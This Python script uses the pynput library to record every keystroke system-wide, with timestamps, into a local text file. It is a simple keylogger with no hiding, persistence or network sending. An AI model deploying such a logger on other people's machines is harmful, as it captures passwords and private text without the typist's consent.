import asyncio
from pynput.keyboard import Key, Listener
from datetime import datetime
import logging
import os
import sys

logging.basicConfig(level=logging.INFO)

inputs = []

def on_press(key):
    global inputs
    key_str = str(key).replace("'", "")
    timestamp_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    inputs.append(f"{key_str} - {timestamp_str}")
    write_to_file()

def write_to_file():
    with open("key_presses.txt", "a") as f:
        for input_str in inputs:
            f.write(input_str + "\n")
        inputs.clear()

def clear_inputs():
    global inputs
    inputs = []

def save_inputs_to_file(filename="key_presses.txt"):
    write_to_file()

async def main():
    logging.info("Starting keyboard listener")
    with Listener(on_press=on_press) as listener:
        listener.join()
        logging.info("Stopping keyboard listener")

if __name__ == "__main__":
    asyncio.run(main())